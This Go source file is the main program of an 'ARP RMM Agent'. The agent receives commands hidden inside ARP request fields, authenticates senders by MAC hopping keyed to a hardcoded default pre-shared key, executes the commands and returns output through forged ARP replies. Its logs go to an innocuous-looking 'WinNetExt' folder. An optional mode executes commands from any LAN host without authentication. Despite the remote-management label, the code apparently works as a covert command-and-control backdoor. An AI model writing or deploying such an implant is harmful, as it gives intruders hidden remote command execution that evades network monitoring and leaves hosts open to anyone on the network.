package main

import (
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"time"

	"arp-rmm/internal/craft"
	"arp-rmm/internal/execution"
	"arp-rmm/internal/fragment"
	"arp-rmm/internal/mac"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func init() {
	// Configure structured logging with timestamps
	log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile)
	
	// When running as a Windows service, write logs to file
	// This enables debugging without console output
	logPath := "C:\\ProgramData\\WinNetExt\\agent.log"
	if logFile, err := os.OpenFile(logPath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666); err == nil {
		log.SetOutput(logFile)
		log.Println("=== AGENT LOG STARTED ===")
	}
}

// NpcapError provides detailed Npcap troubleshooting information
type NpcapError struct {
	Message string
	Details string
}

func (e *NpcapError) Error() string {
	return e.Message + ": " + e.Details
}

// verifyNpcapAvailable checks if Npcap is properly installed and accessible
func verifyNpcapAvailable() error {
	devices, err := pcap.FindAllDevs()
	if err != nil {
		return &NpcapError{
			Message: "Failed to enumerate network devices",
			Details: fmt.Sprintf("pcap.FindAllDevs() error: %v. This usually means Npcap is not installed.", err),
		}
	}

	if len(devices) == 0 {
		return &NpcapError{
			Message: "No network interfaces detected by Npcap",
			Details: "Npcap may not be installed or not in WinPcap-compatible mode",
		}
	}

	// Log available devices for debugging
	log.Println("[DEBUG] Npcap enumeration successful. Available devices:")
	for i, device := range devices {
		log.Printf("[DEBUG]   [%d] %s", i, device.Name)
		if device.Description != "" {
			log.Printf("[DEBUG]       Description: %s", device.Description)
		}
		for j, addr := range device.Addresses {
			log.Printf("[DEBUG]       Address[%d]: %s", j, addr.IP.String())
		}
	}

	return nil
}

func main() {
	iface := flag.String("iface", "", "Network interface to bind (e.g. \\Device\\NPF_{GUID})")
	psk := flag.String("psk", "S3cur3_Adm1n_K3y", "Pre-shared key for MAC hopping")
	mvp := flag.Bool("mvp", false, "MVP mode: accept all ARP traffic (no MAC hopping validation)")
	adminMAC := flag.String("admin-mac", "", "Admin MAC address filter (MVP mode, e.g. 00:11:22:33:44:55)")
	debug := flag.Bool("debug", false, "Enable debug output for troubleshooting")
	flag.Parse()

	log.Println("=== ARP RMM Agent v1.1 (Enhanced Diagnostics) ===")
	log.Printf("Debug mode: %v | MVP mode: %v", *debug, *mvp)

	// Verify Npcap availability before proceeding
	log.Println("[*] Verifying Npcap installation...")
	if err := verifyNpcapAvailable(); err != nil {
		log.Fatalf(
			"[FATAL] Npcap verification failed: %v\n\n"+
				"TROUBLESHOOTING:\n"+
				"1. Ensure Npcap is installed from https://npcap.com/\n"+
				"2. During installation, enable 'WinPcap API-compatible mode'\n"+
				"3. Run this agent as Administrator\n"+
				"4. If already installed, try restarting your system\n\n"+
				"Installation instructions:\n"+
				"  - Download Npcap installer from https://npcap.com/\n"+
				"  - Run installer with Administrator privileges\n"+
				"  - Check option: 'Install Npcap in WinPcap API-compatible Mode'\n"+
				"  - Complete installation and restart\n",
			err)
	}

	log.Println("[+] Npcap verification complete")

	if *iface == "" {
		log.Println("[*] No interface specified, auto-detecting...")
		devices, err := pcap.FindAllDevs()
		if err != nil || len(devices) == 0 {
			log.Fatal("[FATAL] No network interfaces found. Specify -iface flag or verify Npcap installation.")
		}
		*iface = devices[0].Name
		log.Printf("[+] Auto-selected interface: %s", *iface)
	} else {
		log.Printf("[+] Using specified interface: %s", *iface)
	}

	log.Printf("[*] Opening handle on interface: %s", *iface)
	handle, err := craft.OpenHandle(*iface, true)
	if err != nil {
		log.Fatalf(
			"[FATAL] Failed to open interface %s: %v\n\n"+
				"TROUBLESHOOTING:\n"+
				"1. Verify Npcap is installed with WinPcap-compatible mode\n"+
				"2. Check interface name is correct (format: \\Device\\NPF_{GUID})\n"+
				"3. Ensure you're running as Administrator\n"+
				"4. Verify network adapter is connected and enabled\n"+
				"5. Try: Get-NetAdapter -Physical in PowerShell to list interfaces\n",
			*iface, err)
	}
	defer handle.Close()

	log.Println("[*] Setting BPF filter for ARP traffic...")
	if err := handle.SetBPFFilter("arp"); err != nil {
		log.Fatalf("[FATAL] Failed to set BPF filter: %v", err)
	}

	log.Println("=== ARP RMM Agent Ready for Incoming Commands ===")
	log.Printf("Interface: %s", *iface)
	log.Printf("MVP Mode: %v", *mvp)
	log.Printf("PSK: [configured]")
	if *adminMAC != "" {
		log.Printf("Admin MAC Filter: %s (MVP mode)", *adminMAC)
	}

	currentSeq := 0
	cmdBuf := fragment.NewCommandBuffer()
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())

	log.Println("[*] Listening for ARP commands...")

	for packet := range packetSource.Packets() {
		arpLayer := packet.Layer(layers.LayerTypeARP)
		if arpLayer == nil {
			continue
		}
		arp := arpLayer.(*layers.ARP)

		if arp.Operation != layers.ARPRequest {
			continue
		}

		srcMAC := net.HardwareAddr(arp.SourceHwAddress).String()

		if *debug {
			log.Printf("[DEBUG] ARP Request from MAC: %s", srcMAC)
		}

		if !*mvp {
			expected := mac.PredictNextMAC(*psk, currentSeq)
			if srcMAC != expected {
				if *debug {
					log.Printf("[DEBUG] MAC validation failed: got=%s expected=%s", srcMAC, expected)
				}
				continue
			}
		} else if *adminMAC != "" && srcMAC != *adminMAC {
			if *debug {
				log.Printf("[DEBUG] Admin MAC filter: rejected %s (expected %s)", srcMAC, *adminMAC)
			}
			continue
		}

		spa := arp.SourceProtAddress
		if len(spa) < 4 {
			log.Printf("[WARN] Invalid SPA length: %d (expected 4)", len(spa))
			continue
		}

		seqID := int(spa[0] & fragment.SeqIDMask)
		moreFragments := (spa[0] & 0x80) != 0

		log.Printf("[RX] Fragment seq=%d more=%v ctrl=0x%02x data=[%02x %02x %02x]",
			seqID, moreFragments, spa[0], spa[1], spa[2], spa[3])

		ready := cmdBuf.ProcessFragment(spa)
		currentSeq++

		if !ready {
			if *debug {
				log.Printf("[DEBUG] Buffering fragment, waiting for more... (current seq=%d)", seqID)
			}
			continue
		}

		command := cmdBuf.Reassemble()
		cmdBuf.Reset()
		log.Printf("[OK] Reassembled complete command: %q (%d bytes)", command, len(command))

		var response string
		if command == "HELO" {
			response = "READY"
			log.Println("[*] Handshake received: HELO -> READY")
		} else {
			log.Printf("[*] Routing command for execution: %s", command)
			response = execution.RouteCommand(command)
			log.Printf("[OK] Command executed successfully (%d bytes response)", len(response))
		}

		respFrags := fragment.FragmentCommand(response)
		log.Printf("[TX] Fragmenting response into %d ARP packets", len(respFrags))

		for i, frag := range respFrags {
			var respMAC net.HardwareAddr
			if *mvp {
				respMAC = net.HardwareAddr{0x00, 0x11, 0x22, 0x33, 0x44, 0x55}
			} else {
				respMAC = mac.GenerateHoppedMAC(*psk, currentSeq)
			}

			if err := craft.SendARPReply(handle, respMAC, frag); err != nil {
				log.Printf("[ERR] Failed to send fragment %d/%d: %v", i+1, len(respFrags), err)
			} else if *debug {
				log.Printf("[DEBUG] Sent fragment %d/%d from MAC %s", i+1, len(respFrags), respMAC.String())
			}
			currentSeq++
			time.Sleep(10 * time.Millisecond)
		}

		log.Println("[*] Response transmission complete. Waiting for next command...")
	}

	log.Println("[*] Packet capture loop ended (shutting down)")
	os.Exit(0)
}
